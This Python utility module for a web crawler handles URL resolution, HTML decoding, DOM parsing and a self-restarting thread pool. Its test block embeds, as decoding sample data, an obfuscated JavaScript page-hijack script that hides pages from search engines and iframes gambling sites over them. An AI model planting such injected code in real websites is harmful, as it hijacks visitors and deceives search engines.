# -*- coding:utf-8 -*-
# Created by qinwei on 2017/8/4
import datetime
import hashlib
import html
import logging
import re
import threading
import urllib
from time import sleep
from urllib.parse import urljoin

from lxml import etree

from hunters.constant import Regex

logger = logging.getLogger("hunters.util")

RE_BLANK = re.compile("[\s]+", re.M)
RE_XML_ENCODING = re.compile(r"""<\?xml.*?encoding=.*?\?>""", re.I | re.M | re.S)
EMPTY_STR = ""


class StringUtil(object):
    @staticmethod
    def replace_blank(string_data):
        """ remove blank character"""
        if not string_data:
            return EMPTY_STR
        return RE_BLANK.sub("", string_data)


def decode_html(input):
    s = html.unescape(input)
    return s


def remove_xml_encoding(text):
    """ 删除XML的头部标记, 否则fromstring会报错, 不支持检测文本的xml-encoding """
    return RE_XML_ENCODING.sub("", text)


def get_real_url(base_url, relate_url):
    """
    根据当前页面, 解析相对路径的URL成绝对路径, 爬虫等只能通过绝对路径访问


    http://baidu.com/a/b/c.html  --> ../../m.html

    ==> http://baidu.com/a/m.html

    :param base_url: 开始URL
    :param relate_url: 相对路径, 也可以传递一个绝对的, 默认返回一个正确的URL
    :return: 返回绝对路径
    """
    relate_url = Regex.RE_URL_COMMENT.sub("", relate_url.strip())
    if len(relate_url) == 0:
        return base_url

    if relate_url.startswith("javascript"):
        # 对于某些连接是javascript: 跳过
        return ""
    # data:image/png;base64  暂时不需要过滤, 可能会有抓取base64的图片的需求
    # relate_url = parse.unquote(decode_html(relate_url))
    # relate_url = parse.unquote(relate_url)
    relate_url = decode_html(relate_url)
    return urljoin(base_url, relate_url)


def dom(html):
    """ dom 化一个html文档, 以便能够使用cssselect选择器"""
    parser = etree.HTMLParser(collect_ids=False)
    root = etree.fromstring(remove_xml_encoding(html), parser)
    del parser
    return root


def mtime():
    return datetime.datetime.now().microsecond


def md5hex(str_data):
    """ md5 hex"""
    hash_ = hashlib.md5()
    hash_.update(str_data.encode('utf-8'))
    return hash_.hexdigest()


class ForeverThreadPool(object):
    """
    当前线程池会不断的创建max_thread个线程执行 submit方法
    线程挂了也会自己起线程, 直到手动调用shutdown 会配置停止创建新线程
    注意:
    submit()方法调用了线程以后, 会直接启动max_thread去执行.
    """

    def __init__(self, max_thread):
        self._max_thread = max_thread
        self._thread_pool = {}
        self._stop_all = False

    def shutdown(self):
        self._stop_all = True

    def submit(self, target, args):
        threading.Thread(target=self._submit, args=(target, args)).start()

    def _run_thread(self, target, args):

        def exception_wrap():
            try:
                target(*args)
            except Exception as e:
                logger.error("Thread Die [%s] %s" % (threading.currentThread().name, e))
                logger.exception(e)
            self._thread_pool.pop(threading.currentThread().name)

        pending = []

        num_pending = self._max_thread - len(self._thread_pool.keys())

        for i in range(num_pending):
            t = threading.Thread(target=exception_wrap, args=())
            self._thread_pool[t.name] = t
            pending.append(t)

        for t in pending:
            logger.info("Main[%s] START worker[%s]" % (threading.current_thread().name, t.name))
            t.start()

    def _wait_all_threads(self):
        for t in self._thread_pool.values():
            t.join()  #: 等待所有子线程退出

    def _submit(self, target, args):

        while True:

            if self._stop_all:  #: 如果接收到停止信号, 退出循环
                break

            self._run_thread(target, args)

            sleep(0.01)

        self._wait_all_threads()


if "__main__" == __name__:
    teststr = r"""
    var _0xae20=["\x74\x69\x74\x6C\x65","","\x6D\x65\x74\x61",
"\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74",
"\x6E\x61\x6D\x65","\x74\x65\x78\x74\x2F\x73\x74\x79\x6C\x65",
"\x63\x6F\x6E\x74\x65\x6E\x74","\x4E\x4F\x49\x4E\x44\x45\x58\x2C\x20\x4E\x4F\x46\x4F\x4C\x4C\x4F\x57",
"\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64",
"\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65",
"\x76\x69\x65\x77\x70\x6F\x72\x74",
"\x77\x69\x64\x74\x68\x3D\x64\x65\x76\x69\x63\x65\x2D\x77\x69\x64\x74\x68\x3B\x20\x69\x6E\x69\x74\x69\x61\x6C\x2D\x73\x63\x61\x6C\x65\x3D\x31\x2E\x30\x3B\x20\x6D\x61\x78\x69\x6D\x75\x6D\x2D\x73\x63\x61\x6C\x65\x3D\x31\x2E\x30\x3B\x20\x6D\x61\x78\x69\x6D\x75\x6D\x2D\x73\x63\x61\x6C\x65\x3D\x31\x2E\x30\x3B","\u4F18\u53D1","\x69\x6E\x64\x65\x78\x4F\x66","\x79\x6F\x75\x66\x61","\x75\x66\x61","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x6D\x6F\x75\x62\x65\x74\x2E\x63\x6F\x6D","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x6A\x69\x78\x69\x61\x6E\x67\x38\x2E\x63\x6F\x6D","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x68\x65\x69\x67\x68\x74\x3A\x20\x31\x30\x30\x25\x3B\x20\x77\x69\x64\x74\x68\x3A\x20\x31\x30\x30\x25\x3B\x20\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x3A\x20\x72\x67\x62\x28\x32\x35\x35\x2C\x20\x32\x35\x35\x2C\x20\x32\x35\x35\x29\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x20\x77\x69\x64\x74\x68\x3D\x27\x31\x30\x30\x25\x27\x20\x68\x65\x69\x67\x68\x74\x3D\x27\x31\x30\x30\x25\x27\x20\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72\x3D\x27\x30\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x77\x72\x69\x74\x65","\x3C\x73\x74\x79\x6C\x65\x20\x74\x79\x70\x65\x3D\x27\x74\x65\x78\x74\x2F\x63\x73\x73\x27\x3E\x68\x74\x6D\x6C\x7B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x25\x7D\x62\x6F\x64\x79\x20\x7B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x25\x3B\x6F\x76\x65\x72\x66\x6C\x6F\x77\x3A\x68\x69\x64\x64\x65\x6E\x3B\x6D\x61\x72\x67\x69\x6E\x3A\x30\x7D\x3C\x2F\x73\x74\x79\x6C\x65\x3E","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x64\x69\x73\x70\x6C\x61\x79\x3A\x6E\x6F\x6E\x65\x27\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x6C\x61\x6E\x67\x75\x61\x67\x65\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27\x20\x74\x79\x70\x65\x3D\x27\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27\x20\x73\x72\x63\x3D\x27\x68\x74\x74\x70\x3A\x2F\x2F\x6A\x73\x2E\x75\x73\x65\x72\x73\x2E\x35\x31\x2E\x6C\x61\x2F\x31\x38\x39\x37\x39\x35\x33\x34\x2E\x6A\x73\x27\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E\x3C\x3C\x2F\x64\x69\x76\x3E"];var title=document[_0xae20[0]];title= decodeURI(title);
var description=_0xae20[1];var keyword=_0xae20[1];var writeHtml=_0xae20[1];var ROBOTS=document[_0xae20[3]](_0xae20[2]);ROBOTS[_0xae20[4]]= _0xae20[5];ROBOTS[_0xae20[6]]= _0xae20[7];
document[_0xae20[10]](_0xae20[9])[0][_0xae20[8]](ROBOTS);var viewport=document[_0xae20[3]](_0xae20[2]);viewport[_0xae20[4]]= _0xae20[11];viewport[_0xae20[6]]= _0xae20[12];document[_0xae20[10]](_0xae20[9])[0][_0xae20[8]](viewport);if(title[_0xae20[14]](_0xae20[13])!=  -1|| title[_0xae20[14]](_0xae20[15])!=  -1|| title[_0xae20[14]](_0xae20[16])!=  -1){writeHtml= _0xae20[17]}else
 {writeHtml= _0xae20[18]};var html=_0xae20[19]+ writeHtml+ _0xae20[20];document[_0xae20[21]](html);
 document[_0xae20[21]](_0xae20[22]);document[_0xae20[21]](_0xae20[23])
 
 "\u4e00\u4e01\u4e02"
 "%3c%3c%3c"
    """
    str_ = bytes(teststr, encoding="UTF-8").decode("unicode_escape")
    print(str_)
    url = get_real_url("http://www.baidu.com", "/about.html#areas")
    print(url)
    url = "http://www.so.com:80/s?ie=utf-8&amp;q=%E5%8C%97%E4%BA%AC%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5&amp;src=hao_weather"
    url = get_real_url("http://www.baidu.com", url)
    print(url)
    print(decode_html(teststr))
    print(urllib.parse.unquote(str_))
    print(dom("<a>mm</a>").cssselect('a')[0].text)

    logging.basicConfig(level=logging.INFO)


    def run():
        data = "a"
        for i in range(0x4e00, 0xffff):
            data += chr(i)
        print(data[:10])
        raise ValueError("eee")
